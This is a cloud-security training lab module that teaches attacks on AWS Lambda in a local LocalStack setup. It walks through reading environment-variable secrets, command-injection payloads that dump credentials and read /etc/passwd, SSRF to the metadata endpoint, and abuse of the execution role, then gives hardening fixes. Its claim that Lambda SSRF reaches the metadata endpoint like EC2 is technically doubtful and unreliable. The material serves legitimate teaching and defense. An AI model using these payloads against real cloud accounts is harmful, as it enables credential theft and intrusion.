---
title: "Cloud Practice — Lambda and Serverless Attacks"
tags: [cloud-practice, AWS, Lambda, serverless, env-var-theft, event-injection,
       command-injection, SSRF, execution-role, Secrets-Manager, lab]
module: 04-BroadSurface-02
day: 199
related_topics:
  - Lambda and Serverless Attacks (Day 187)
  - IAM Misconfiguration Attacks (Day 183)
  - Cloud Full Attack Lab (Day 192)
  - Cloud Security Review (Day 196)
---

# Day 199 — Cloud Practice: Lambda and Serverless

> "Lambda is interesting because attackers don't often think about it, and
> defenders rarely instrument it. The function runs, it terminates, no logs unless
> you explicitly ship them. And yet the execution role often has more permissions
> than the EC2 instance, because whoever deployed it figured 'it's just a function,
> how bad can the blast radius be?' Today you find out how bad."
>
> — Ghost

---

## Goals

By the end of today's practice session you will be able to:

1. Extract secrets from Lambda environment variables using `GetFunctionConfiguration`.
2. Exploit event injection (command injection via Lambda event payload).
3. Abuse Lambda execution role credentials for lateral movement.
4. Enumerate all Lambda functions and their attack surface.
5. Fix each vulnerability with the correct control (Secrets Manager, input
   validation, least-privilege role).

---

## Prerequisites

| Requirement | Reference |
|---|---|
| Lambda and Serverless Attacks | Day 187 |
| IAM Misconfiguration Attacks | Day 183 |
| Cloud Full Attack Lab | Day 192 |
| LocalStack + awslocal | `pip install localstack awscli-local` |

---

## Lab Setup

```bash
cd learn-security/04-BroadSurface-02/samples/lambda-practice/
docker compose up -d

# Lab pre-configures:
# Lambda function: process-file     — env var theft target
# Lambda function: run-command      — command injection target
# Lambda function: fetch-url        — SSRF via event target
# Lambda function: data-pipeline    — overpermissioned execution role
# LocalStack endpoint: http://localhost:4566

source .env
export AWS_ENDPOINT_URL="http://localhost:4566"
export AWS_DEFAULT_REGION="us-east-1"

# Enumerate all Lambda functions
aws lambda list-functions | jq '[.Functions[] | {Name: .FunctionName, Runtime: .Runtime}]'
```

---

## Block 1 — Enumeration (20 min)

```bash
# For each Lambda function, gather the full attack surface
for fn in $(aws lambda list-functions --query 'Functions[*].FunctionName' --output text); do
  echo "===== $fn ====="

  # Environment variables (potential secrets)
  aws lambda get-function-configuration \
    --function-name $fn \
    | jq '{
        Runtime: .Runtime,
        Role: .Role,
        Handler: .Handler,
        EnvVars: .Environment.Variables,
        Timeout: .Timeout,
        MemorySize: .MemorySize
      }'

  # Download and inspect the code
  CODE_URL=$(aws lambda get-function \
    --function-name $fn \
    --query 'Code.Location' --output text)
  curl -s "$CODE_URL" -o /tmp/${fn}.zip 2>/dev/null
  unzip -p /tmp/${fn}.zip "*.py" 2>/dev/null | head -80

  echo ""
done
```

**What to look for:**
- Environment variables containing: `PASSWORD`, `SECRET`, `TOKEN`, `KEY`, `CREDS`
- Handler code with `subprocess`, `os.system`, `shell=True`, `eval`, `exec`
- Handler code making HTTP requests using input from the event
- Execution role ARN — check its permissions next

---

## Block 2 — Environment Variable Theft (20 min)

```bash
# Target: process-file function
aws lambda get-function-configuration \
  --function-name process-file \
  | jq '.Environment.Variables'

# Expected output:
# {
#   "DB_HOST": "rds.us-east-1.amazonaws.com",
#   "DB_PASSWORD": "Pr0d-DB-P@ss!99",
#   "STRIPE_SECRET_KEY": "sk_live_abc123xyz",
#   "JWT_SECRET": "super-secret-jwt-key",
#   "INTERNAL_API_KEY": "int-api-key-prod-9876"
# }

# Document each secret:
echo "DB password: can be used to connect directly to the database"
echo "Stripe key: can be used to create refunds, read transactions, enumerate cards"
echo "JWT secret: can forge authentication tokens for any user in the system"
echo "Internal API key: can call internal services directly bypassing auth"

# Try using the DB credentials (in a real engagement, not this lab)
# PGPASSWORD="Pr0d-DB-P@ss!99" psql -h rds... -U app_user -d appdb

# Impact: one API call → all production secrets
```

---

## Block 3 — Command Injection via Event (45 min)

```bash
# Target: run-command function
# First, review the code to understand the vulnerability

# Expected vulnerable code (from enumeration):
# import subprocess, json
# def handler(event, context):
#     cmd = event.get("command", "echo hello")
#     result = subprocess.run(cmd, shell=True, capture_output=True)
#     return {"output": result.stdout.decode()}

# Baseline test
aws lambda invoke \
  --function-name run-command \
  --payload '{"command": "echo hello"}' \
  /tmp/output.json
cat /tmp/output.json
# → {"output": "hello\n"}

# Confirm injection — read the Lambda's environment variables
aws lambda invoke \
  --function-name run-command \
  --payload '{"command": "env"}' \
  /tmp/output.json
cat /tmp/output.json
# → All environment variables including AWS credentials

# Extract the execution role credentials from the environment
aws lambda invoke \
  --function-name run-command \
  --payload '{"command": "echo $AWS_ACCESS_KEY_ID $AWS_SECRET_ACCESS_KEY $AWS_SESSION_TOKEN"}' \
  /tmp/output.json
cat /tmp/output.json

# Use the extracted credentials (the Lambda role, not your IAM user)
LAMBDA_CREDS=$(aws lambda invoke \
  --function-name run-command \
  --payload '{"command": "env | grep AWS"}' \
  /tmp/output.json && cat /tmp/output.json | jq -r '.output')

echo "Lambda execution role credentials extracted via command injection"
echo "$LAMBDA_CREDS"

# Read sensitive files in the Lambda execution environment
aws lambda invoke \
  --function-name run-command \
  --payload '{"command": "cat /etc/passwd; ls /var/task/"}' \
  /tmp/output.json
cat /tmp/output.json | jq -r '.output'

# List S3 buckets using the Lambda execution role
aws lambda invoke \
  --function-name run-command \
  --payload '{"command": "aws s3 ls --endpoint-url http://localstack:4566"}' \
  /tmp/output.json
cat /tmp/output.json | jq -r '.output'
```

### 3.1 — Fix: Remove shell=True

```python
# Vulnerable:
result = subprocess.run(cmd, shell=True, capture_output=True)

# Fixed:
import shlex
ALLOWED_COMMANDS = {"echo", "ls", "date"}
cmd_parts = shlex.split(cmd)
if cmd_parts[0] not in ALLOWED_COMMANDS:
    return {"error": "Command not permitted"}
result = subprocess.run(cmd_parts, capture_output=True)  # shell=False (default)
```

---

## Block 4 — SSRF via Lambda Event (30 min)

```bash
# Target: fetch-url function
# Expected vulnerable code:
# import requests
# def handler(event, context):
#     url = event.get("url", "")
#     return {"body": requests.get(url).text}

# Baseline
aws lambda invoke \
  --function-name fetch-url \
  --payload '{"url": "http://httpbin.org/ip"}' \
  /tmp/output.json
cat /tmp/output.json | jq -r '.body'

# SSRF to IMDS — extract execution role credentials
aws lambda invoke \
  --function-name fetch-url \
  --payload '{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}' \
  /tmp/output.json
ROLE_NAME=$(cat /tmp/output.json | jq -r '.body')
echo "Lambda role name: $ROLE_NAME"

aws lambda invoke \
  --function-name fetch-url \
  --payload "{\"url\": \"http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME\"}" \
  /tmp/output.json
cat /tmp/output.json | jq '.body | fromjson'
# → AccessKeyId, SecretAccessKey, Token for the Lambda execution role

# SSRF to internal services (if URL is predictable)
aws lambda invoke \
  --function-name fetch-url \
  --payload '{"url": "http://internal-api.labcorp.local/admin/users"}' \
  /tmp/output.json
cat /tmp/output.json | jq -r '.body'
```

---

## Block 5 — Execution Role Abuse (30 min)

```bash
# Get the execution role ARN for data-pipeline
ROLE_ARN=$(aws lambda get-function-configuration \
  --function-name data-pipeline \
  --query 'Role' --output text)

echo "Execution role: $ROLE_ARN"

# Check the role's permissions (simulate as an attacker with those stolen creds)
# Use the creds you extracted via command injection in Block 3
export AWS_ACCESS_KEY_ID="[stolen from Block 3]"
export AWS_SECRET_ACCESS_KEY="[stolen from Block 3]"
export AWS_SESSION_TOKEN="[stolen from Block 3]"

# Enumerate with the Lambda role
aws sts get-caller-identity
aws s3 ls
aws iam get-role --role-name $(echo $ROLE_ARN | cut -d'/' -f2)
aws secretsmanager list-secrets 2>/dev/null
aws rds describe-db-instances 2>/dev/null | jq '.DBInstances[].Endpoint'

# The Lambda execution role often has more permissions than the invoking user
# This is the privilege escalation: invoke Lambda → inherit its role
```

---

## Block 6 — Hardening (20 min)

Apply fixes for all vulnerabilities found in Blocks 2–5:

```bash
# Fix 1: Move secrets from env vars to Secrets Manager
aws secretsmanager create-secret \
  --name "prod/process-file/credentials" \
  --secret-string '{
    "db_password": "Pr0d-DB-P@ss!99",
    "stripe_key": "sk_live_abc123xyz",
    "jwt_secret": "super-secret-jwt-key"
  }'

# Remove env vars from the Lambda function
aws lambda update-function-configuration \
  --function-name process-file \
  --environment '{"Variables": {}}'

# Update function code to load from Secrets Manager at runtime
# (See Day 195 secrets_manager_pattern.py)

# Fix 2: Remove lambda:GetFunctionConfiguration from any overpermissioned roles
# Only CI/CD pipelines need this permission
aws iam put-role-policy \
  --role-name dev-readonly-role \
  --policy-name DenyGetFunctionConfig \
  --policy-document '{
    "Statement": [{
      "Effect": "Deny",
      "Action": ["lambda:GetFunctionConfiguration", "lambda:GetFunction"],
      "Resource": "*"
    }]
  }'

# Fix 3: IAM Access Analyzer — find all external access to Lambda
aws accessanalyzer list-findings \
  --analyzer-arn arn:aws:access-analyzer:us-east-1:000000000000:analyzer/account-analyzer \
  | jq '.findings[] | select(.resource | contains("function"))'
```

---

## Key Takeaways

1. **`lambda:GetFunctionConfiguration` is a one-call secret dump.** Any principal
   with this permission can read all environment variables. Remove it from every
   non-CI/CD role in production.
2. **`shell=True` in a Lambda handler is remote code execution by design.** The
   function is internet-accessible; the execution environment has AWS credentials.
   The blast radius is the entire execution role.
3. **Lambda execution roles are commonly over-permissioned.** The function was
   built quickly; the role was given broad permissions for convenience. An attacker
   who obtains the execution role credentials via SSRF or command injection inherits
   all of those permissions.
4. **SSRF in a Lambda function hits IMDS just like EC2.** IMDSv2 is enforced at
   the instance level; Lambda functions do not run on EC2 directly — they run on
   AWS-managed infrastructure where IMDSv2 is enabled, but the task metadata
   endpoint at `169.254.169.254` is still accessible in many configurations.
5. **Secrets Manager with `@lru_cache` is the correct pattern.** One network call
   per Lambda container lifetime, secret not visible in any API response, rotatable
   without redeployment.

---

## Exercises

1. Write a Lambda function that is deliberately vulnerable to command injection.
   Deploy it to LocalStack. Write the exploit as a Python script that: (a)
   extracts the execution role credentials, (b) uses them to list all S3 buckets.
2. Write the fixed version of the same function using `subprocess.run` with
   `shell=False` and an allowlist. Confirm the exploit no longer works.
3. Research: AWS Lambda Powertools `Parameters` utility — how does it fetch from
   Secrets Manager? Does it cache? How does this compare to `@lru_cache`?
4. Write a Sigma rule that detects `GetFunctionConfiguration` calls by principals
   outside of CI/CD roles. What field do you use to distinguish CI/CD from manual
   attacker sessions?

---

## Questions

> Add your questions here. Each question gets a Global ID (Q199.1, Q199.2 …).
> Follow-up questions use hierarchical numbering (Q199.1.1, Q199.1.2 …).

---

## Navigation

← Previous: [Day 198 — Cloud Practice: S3 Attacks](DAY-0198-Cloud-Practice-S3-Attacks.md)
→ Next: [Day 200 — Milestone: 200 Days Review](DAY-0200-Milestone-200-Days-Cloud-Review.md)
